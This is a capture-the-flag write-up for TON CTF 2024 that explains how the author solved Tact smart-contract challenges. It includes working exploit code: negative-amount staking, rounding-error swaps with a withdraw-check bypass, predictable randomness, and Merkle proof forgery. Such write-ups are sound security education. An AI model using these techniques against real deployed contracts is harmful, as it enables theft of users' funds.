---
weight: 5
title: "TON CTF 2024 Writeup"
date: 2024-09-28T16:55:28+08:00
lastmod: 2024-09-28T16:55:28+08:00
draft: false
author: "Qi Qin"
authorLink: "https://leoq7.com"
description: "Writeup for TON CTF 2024"
images: []
# resources:
# - name: "featured-image"
#   src: "featured-image.jpg"


tags: ["Web3", "CTF", "TON"]
categories: ["Web3"]

twemoji: false
lightgallery: true
---

## Preface

The TON CTF 2024, sponsored by the TON Foundation and organized by Tonbit and TONX Studio, was an exciting competition that featured 8 challenges. The tasks were divided into three categories: 3 easy challenges worth 100 points, 3 medium challenges worth 200 points, and 2 difficult ones valued at 300 points.

What made this CTF unique was that all the challenges were written in Tact, a high-level language designed for the TON ecosystem. Tact compiles down to Func, another programming language, which then further compiles into Fift and finally down to bytecode for the VM. While I had previously dabbled with Func, this was my first time working with Tact, and I picked up quite a few new things along the way.

## The Challenges of TON CTF vs. Other Web3 CTFs

Compared to other Web3 CTFs, the TON ecosystem presents unique challenges. First, the tooling within the TON ecosystem is still in active developing. Additionally, due to TON's emphasis on speed, many operations, such as smart contract calls, are asynchronous. Finally, all the challenges in this CTF were deployed on a private chain, which introduced another layer of complexity when interacting with the contracts.

Tact contracts offer TypeScript interfaces for interaction, but since I’m not very familiar with TypeScript and wanted more granular control over the cells being sent, I decided to write my own interaction framework in Python.

### Building a Python Framework for TON Interactions

The provided RPC interface was similar to **Ton Center v2**, which meant I could override the `Client` class from the `tonutils` library with a few modifications:

```python
from tonutils.client import Client
from pytoniq_core import Address
from tonutils.utils import boc_to_base64_string
from tonutils.wallet import WalletV3R2

class CTFClient(Client):
    def __init__(self, url: str) -> None:
        super().__init__(base_url=url, headers={})

    async def run_get_method(self, address: str, method_name: str, stack: Optional[List[Any]] = None) -> Any:
        body = {
            "address": address,
            "method": method_name,
            "stack": [
                {"type": "num", "value": str(v)} if isinstance(v, int) else {"type": "slice", "value": v}
                for v in (stack or [])
            ],
        }
        return await self._post(method="runGetMethod", body=body)

    async def send_message(self, boc: str) -> None:
        status = await self._post(method="sendBoc", body={"boc": boc_to_base64_string(boc)})
        print(status)
        
    async def get_balance(self, address: str) -> int:
        result = await self._get(method="getAddressBalance", params={"address": address})
        return int(result['result'])
    
    async def get_transaction(self, address: str, lt: str, txhash: str) -> dict:
        result = await self._get(method="getTransactions", params={"address": address, "hash": txhash, "lt": lt, 'limit': 1})
        return result['result']
    
    async def get_address_info(self, address: str) -> dict:
        result = await self._get(method="getAddressInformation", params={"address": address})
        return result['result']
    
    async def get_last_transaction(self, address: str) -> dict:
        result = await self._get(method="getAddressInformation", params={"address": address})
        txhash = result['result']['last_transaction_id']['hash']
        new_txhash = txhash
        while txhash == new_txhash:
            result = await self._get(method="getAddressInformation", params={"address": address})
            lt = result['result']['last_transaction_id']['lt']
            new_txhash = result['result']['last_transaction_id']['hash']
            print('find:', new_txhash)
        return await self.get_transaction(address, lt, new_txhash)

class CTFWallet(WalletV3R2):
    @classmethod
    async def get_seqno(cls, client: Client, address: Union[Address, str]) -> int:
        if isinstance(address, Address):
            address = address.to_str()

        method_result = await client.run_get_method(
            address=address,
            method_name="seqno",
        )

        return int(method_result['result']["stack"][0][1], 16)
```

As I mentioned earlier, smart contract interactions in the TON blockchain aren’t atomic. To ensure that transactions from my wallet to the challenge contract were fully executed, I added a new method to the `Client` class, `get_last_transaction`. Although the method name might not seem entirely fitting, its purpose was to wait for a new transaction (usually the one I intended) to appear in the challenge contract.

### Leveraging the Framework for the CTF

With this framework in place, interacting with the contracts became straightforward. After initializing a `CTFWallet` object, I simply used the `transfer` method to fill in the desired cell in the transaction body:

```python
CONTRACT = "EQDSxcBDK2QRgtZIg9PWMDVTBZrRLgAE8cRi5mKuH_zwLs4T"

async def main():
    client = CTFClient("http://65.21.223.95:8081/")
    wallet, public_key, private_key, mnemonic = CTFWallet.from_mnemonic(client, MNEMONIC)

    builder = begin_cell().store_uint(0x868dd340, 32).store_uint(23019947, 257)
    cell = builder.end_cell()
    await wallet.transfer(CONTRACT, amount=1, body=cell)
    print(await client.get_last_transaction(CONTRACT))
    
    print(await client.run_get_method(CONTRACT, "is_solved"))
    

if __name__ == '__main__':
    asyncio.run(main())
```

This setup provided me with the flexibility and control I needed during the competition, allowing me to send tailored messages to the contract and interact efficiently with the provided tasks.


## Airdrop
    
{{< admonition note "Challenge Info" >}}
- Source: https://github.com/TonBitSec/TonCTF-Challenges/tree/main/airdrop
- Score: 100
{{< /admonition >}}
    
The first challenge in the competition was called **Airdrop**. As the name suggests, the contract allowed each user to claim an airdrop of 1 token. The initial supply of the contract was set to 30,000, and the goal of the challenge was to deplete this initial supply.

The vulnerability, however, wasn’t in the airdrop functionality itself, but in the deposit and withdrawal functions of the contract. A common pitfall when writing smart contracts is improper usage of signed integers, and this contract fell into that trap. Signed integers should only be used when absolutely necessary, but in this contract, they were used extensively, leading to a critical vulnerability.

### The Vulnerability

When a user staked TON, the contract checked whether the provided `amount` was less than the actual TON transferred. However, there was no check to ensure that `amount` was a positive value. This opened the door for an attacker to pass a **negative amount**, which allowed them to manipulate the balance.

### The Exploit

By analyzing the compiled contract, I found that the function responsible for staking, `UserStake`, had a selector of `f82b6291`. All I had to do was pass a negative value of `-30,000` as the amount to exploit the vulnerability. This would cause the contract’s balance to be manipulated.

```ts
begin_cell().store_uint(0xf82b6291, 32).store_int(-30000, 257).end_cell()
```
    
## Random
    
{{< admonition note "Challenge Info" >}}
- Source: https://github.com/TonBitSec/TonCTF-Challenges/tree/main/random
- Score: 100
{{< /admonition >}}

The second challenge, **Random**, involved guessing a lucky number. The contract would take a user-provided `luckynumber` parameter, and if it matched a value derived from the hash of the following cell:

```ts
beginCell().storeAddress(myAddress()).storeAddress(sender()).storeUint(now(), 64).endCell()
```

The contract would then set a flag to `1`, indicating that the user had solved the challenge.

### The Vulnerability

The contract didn’t use a native random function but rather constructed its own random number generator based on the hash of the aforementioned cell. This approach is inherently insecure since the value of `now()` can be reasonably estimated, which makes the random number predictable.

However, given that the range of the generated random number was relatively small (from 0 to 99), instead of predicting the random number, I opted for a brute-force approach by repeatedly sending `luckynumber` values until I got the correct one.

## Eccs
    
{{< admonition note "Challenge Info" >}}
- Source: https://github.com/TonBitSec/TonCTF-Challenges/tree/main/eccs
- Score: 100
{{< /admonition >}}


The third challenge, **Eccs**, was added as a replacement for a previous on-chain data analysis challenge that had multiple issues in its description. The organizers eventually took that challenge down and replaced it with this one. **Eccs** was quite similar to the "Easy ECC" problem from the testing phase, as it implemented standard elliptic curve addition and multiplication. The goal was to solve the **ECDLP**.

Since the problem’s scale was relatively small, I could directly use **SageMath** to solve the ECDLP. Interestingly, although the code defined $b = 2$, the actual `b` value used was `3`.

```python
F = Zmod(738077334260605249)
E = EllipticCurve(F, [1, 3])
p1 = E(627636259244800403, 317346088871876181)
p2 = E(456557409365020317, 354112687690635257)
print(p1.discrete_log(p2))
```

Running this script gave the solution `844279`.

Once Sage provided the solution, I simply had to send the following cell to solve the challenge:

```python
begin_cell().store_uint(0x868dd340, 32).store_uint(844279, 257).end_cell()
```
    
## Dex
    
{{< admonition note "Challenge Info" >}}
- Source: https://github.com/TonBitSec/TonCTF-Challenges/tree/main/dex
- Score: 200
{{< /admonition >}}

Unlike the previous mathematical challenge **Eccs**, the **Dex** challenge was much more engaging, combining a common issue in DeFi—**rounding errors**—with some unique features of the TON blockchain.

### The Vulnerability

If you're familiar with auditing or securing DeFi projects, you might have quickly spotted the vulnerability in the swap implementation. The contract incorrectly rounded the `out_amount` up during a swap, which allowed users to exploit the rounding error for profit. 

However, simply exploiting the rounding error wasn’t enough to solve the challenge. After taking advantage of the bug, the contract would only set the `lock` variable to `True`. To fully solve the challenge, a second condition needed to be met: the TON balance of the contract’s account had to drop below **0.5 TON**. 

Since the contract required a minimum of 0.14 TON for each operation, it was clear that performing just three swaps wouldn't be enough to fully deplete the balance. This meant I had to trigger a withdrawal to reduce the contract's balance further.

### Bypassing the Withdrawal Check

In the contract’s `withdraw` function, there was a balance check that required:

```ts
require(myBalance() > ton("1.0") + self.storageReserve + msg.value, "Insufficient balance");
```

This check ensured that the balance of the contract, minus the amount the user wanted to withdraw, had to exceed **1 TON** plus the **storage reserve** (0.1 TON). 

At first glance, this seemed like a limitation that would prevent us from depleting the contract's balance below 0.5 TON. However, there was a clever workaround. When calling the `withdraw` function, if I attached a sufficiently large amount of TON, this amount would temporarily increase the `myBalance()` that the contract checked against.

Since the actual withdrawal used the **SendRemainingValue** mode, the contract would return any excess TON back to me, bypassing the balance check while still allowing me to withdraw funds.

### The Exploit

Here’s the code I used to perform the exploit:

```python
await wallet.transfer(CONTRACT, amount=0.15, body='CreateUser')
print(await client.get_last_transaction(CONTRACT))

async def swap_1(amount):
    builder = begin_cell().store_uint(0x40e869ea, 32).store_coins(amount).store_uint(0x1, 257)
    cell = builder.end_cell()
    await wallet.transfer(CONTRACT, amount=0.15, body=cell)
    print(await client.get_last_transaction(CONTRACT))

async def swap_2(amount):
    builder = begin_cell().store_uint(0x40e869ea, 32).store_coins(amount).store_uint(0x2, 257)
    cell = builder.end_cell()
    await wallet.transfer(CONTRACT, amount=0.15, body=cell)
    print(await client.get_last_transaction(CONTRACT))

# Perform the swaps
await swap_1(3)
await swap_2(1)
await swap_2(2)

await swap_1(2)
await swap_2(1)
await swap_2(1)

await swap_1(2)
await swap_2(1)
await swap_2(2)

await swap_1(1)
await swap_2(1)
await swap_2(1)

await swap_1(1)
await swap_2(1)
await swap_2(1)

await swap_1(1)
await swap_2(1)
await swap_2(1)
await swap_2(1)

await swap_1(1)
await swap_2(1)
await swap_2(1)

await swap_1(1)

# Perform withdrawal with the required amount
builder = begin_cell().store_uint(0xa4a52dd3, 32).store_coins(5212062305)
cell = builder.end_cell()
await wallet.transfer(CONTRACT, amount=2, body=cell)
print(await client.get_last_transaction(CONTRACT))

# Call Solve method
await wallet.transfer(CONTRACT, amount=0.1, body='Solve')
print(await client.get_last_transaction(CONTRACT))

# Check if solved
print(await client.run_get_method(CONTRACT, "is_solved"))
```

**Note:**
- My approach to exploiting the rounding error was far from optimal. There’s room for improvement to reduce the number of swaps.
- The withdrawal amount I used in the code might need to be adjusted depending on the actual balance of the contract’s account at the time of the attack.



## Puzzle
    
{{< admonition note "Challenge Info" >}}
- Source: https://github.com/TonBitSec/TonCTF-Challenges/tree/main/puzzle
- Score: 200
{{< /admonition >}}

As the name suggests, the **Puzzle** challenge was a straightforward puzzle, but it came with a subtle trap in the contract’s code. Specifically, all the bitwise shift operations in the contract didn’t include any assignment, rendering them ineffective. Once I realized this, solving the challenge became much simpler.

Ignoring the ineffective shift operations, the order of the operations wasn’t particularly important. The goal was to figure out how each operation affected the sum of the six member variables. After observing how each operation changed the sum, I could either manually adjust the values to meet the required conditions or use a solver like **Z3** to automate the process.

## Curve
    
{{< admonition note "Challenge Info" >}}
- Source: https://github.com/TonBitSec/TonCTF-Challenges/tree/main/curve
- Score: 200
{{< /admonition >}}


The **Curve** challenge was another mathematical puzzle, unrelated to the core features of the TON ecosystem. It revolved around solving a discrete logarithm problem on a given curve, where the contract implemented curve addition and multiplication.

### Understanding the Curve

The curve's behavior is defined in the challenge’s contract, specifically in the section that calculates the slope (`m`) during the point addition process:

```typescript
if (x1 == x2 && y1 == y2) {
    m = ((self.a * ((x1 + x2) % self.p) % self.p) + self.b) % self.p;
} else {
    m = (((y2 - y1) % self.p) * self.invMod(x2 - x1, self.p)) % self.p;
}
```

By analyzing this code, we observe that the slope calculation aligns with the properties of a quadratic curve in the form $y = ax^2 + bx + c$.

### Curve Addition Implementation

The next part of the contract code handles the point addition on the curve:

```typescript
x3 = ((((m - self.b) * self.invMod(self.a, self.p)) % self.p) - self.zero.x) % self.p;
y3 = (((x3 - self.zero.x) * m) % self.p + self.zero.y) % self.p;
return Point{x: x3 % self.p, y: y3 % self.p};
```

Upon deeper inspection of the point addition implementation, we can see that the formula for $x_3$ simplifies to:


$$x_3 = x_1 + x_2 - x_0$$

This observation reveals that for repeated point addition (i.e., curve multiplication), the result follows the relation:

$$x_Q = k \cdot x_P - (k - 1) \cdot x_0$$ where $Q = k \cdot P$.

Given this relationship, we can simplify the challenge to doing integer division over $\mathbb{F}_p$. We are tasked with finding the multiplier `k` that satisfies:

$$k = \frac{x_2 - x_0}{x_1 - x_0} \pmod{p}$$

The solution can be found using the following Python script:

```python
from Crypto.Util.number import inverse

p = 1124575627794835616567
x0 = 26268578989036317972
x1 = 983810924364991907519
x2 = 1098402780140240490917

k = (x2 - x0) * inverse(x1 - x0, p) % p
print(k)
```

## Ecc
    
{{< admonition note "Challenge Info" >}}
- Source: https://github.com/TonBitSec/TonCTF-Challenges/tree/main/ecc
- Score: 300
{{< /admonition >}}

Similar to the previous **Curve** challenge, this problem implemented curve addition and multiplication, requiring participants to solve the **DLP** between two points.

### Understanding the Curve

The curve’s slope calculation was defined in the contract as follows:

```typescript
if (x1 == x2 && y1 == y2) {
    m = ((((3 * ((x1 * x2) % self.p) % self.p) + 4 * x1 + 1) % self.p) * (self.invMod(y1 + y2, self.p) % self.p)) % self.p;
} else {
    m = (((y2 - y1) % self.p) * self.invMod(x2 - x1, self.p)) % self.p;
}
```

By analyzing the slope calculation and substituting the values provided in the challenge, we deduce that the equation of the curve is:

$$ y^2 = x^3 + 2x^2 + x = x(x + 1)^2 $$

This curve is **singular**, which is evident because it has a node. Singular curves behave differently from regular elliptic curves, and the DLP on such curves can be reduced to solving a DLP in an isomorphic group where solving DLP is much easier.

### Solving the DLP

For this singular curve, we can calculate the two roots of the equation:

1. The roots are **0** and **769908256801248** (which corresponds to **x = -1**).
2. For the non-zero root, **α = 769908256801248**, we compute the square root **t = 171237201247109**.

With this information, we can transform the DLP on the curve into a simpler form in the isomorphic group:

```python
u = (Gy + t * (Gx - alpha)) / (Gy - t * (Gx - alpha))
v = (Py + t * (Px - alpha)) / (Py - t * (Px - alpha))
v.log(u)
```

## MerkleAirdrop
    
{{< admonition note "Challenge Info" >}}
- Source: https://github.com/TonBitSec/TonCTF-Challenges/tree/main/merkle_airdrop
- Score: 300
{{< /admonition >}}

The **MerkleAirdrop** challenge implemented an airdrop system based on a **Merkle Tree**. The challenge initialized a Merkle Tree and allowed a specific address—`EQDaypwc_Jr8by-alaK4mntRu35_EhlMz60AOeSJRawcrNM0`—to claim 614 tokens. The goal was to exploit the airdrop mechanism and forge a valid claim by tampering with the Merkle Tree proof.

### The Vulnerability

Upon reviewing the `verify` function, I noticed that the way the parent nodes in the Merkle Tree were computed was unusual. Instead of concatenating and hashing the child nodes together (as is typical for Merkle Trees), the function simply calculated the **difference** between the two node values.

```ts
fun verify(leaf: Int, proofs: map<Int, Int>, proofLength: Int): Bool {
    let i: Int = 0;
    require(proofLength + 1 == self.merkleTreeHeight, "Invalid proof length");
    while (i < proofLength) {
        let proof: Int? = proofs.get(i);
        if (proof == null) {
            return false;
        }
        leaf = leaf > proof!! ?
        sha256((leaf - proof!!).toString()) :
        sha256((proof!! - leaf).toString());
        i = i + 1;
    }
    return leaf == self.merkleRoot;
}
```

Instead of the standard hashing approach, this implementation allowed us to manipulate the proof. By controlling the final input passed to the `sha256` function, we could fabricate a valid proof based on a known hash.

### The Exploit

To exploit the vulnerability, I only needed to modify the **last proof element** while keeping the earlier proofs intact. This adjustment let me control the input to the final `sha256` operation, allowing me to bypass the verification process.

The challenge provided a set of data for the Merkle Tree verification:

```ts
let seedBuilder: StringBuilder = beginString();
seedBuilder.append("EQDaypwc_Jr8by-alaK4mntRu35_EhlMz60AOeSJRawcrNM0");
seedBuilder.append("614");
let leaf: Int = sha256(seedBuilder.toString());

let nodes: map<Int, Int> = emptyMap();
nodes.set(0, 3276839473039418448246626220846442448842246862622804046064860066224006800084);
nodes.set(1, 47247882347545520880400048062206626448448620004800866600228646060442282848824);
nodes.set(2, 17983245880419772846408460262448682866408688862244064640442682866626888428288);
```

Using the valid leaf, in the while loop, I dumped the values passed to the `sha256` function to analyze the last round’s parameters.

To modify the claim amount, I changed the target `leaf` value to represent a claim of **10,000 tokens**. By adjusting the last proof value, I could ensure the `sha256` input matched the expected value.

For example:

- Original final `sha256` input: `90114452958426129291090095054266392995908099809161431530770587638743766783525`
- Modified final **leaf** value for a 10,000 token claim: `108097698838845902137498555316715075862316788671405496171213270505370655211813`

Given $leaf > target$, we can set the last entry of proofs to `leaf-target` which is `17983245880419772846408460262448682866408688862244064640442682866626888428288` to bypass the verification.